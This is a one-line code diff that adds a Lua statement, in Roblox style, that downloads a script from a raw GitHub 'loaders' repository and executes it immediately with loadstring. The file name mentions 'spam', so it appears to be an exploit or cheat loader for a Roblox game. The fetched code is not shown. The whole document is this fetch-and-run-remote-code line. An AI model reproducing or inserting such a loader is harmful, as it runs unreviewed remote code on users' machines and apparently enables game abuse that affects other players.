@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/interrogation-new-cases-spam2-vr1c9lkoo3jv2z.lua"))()
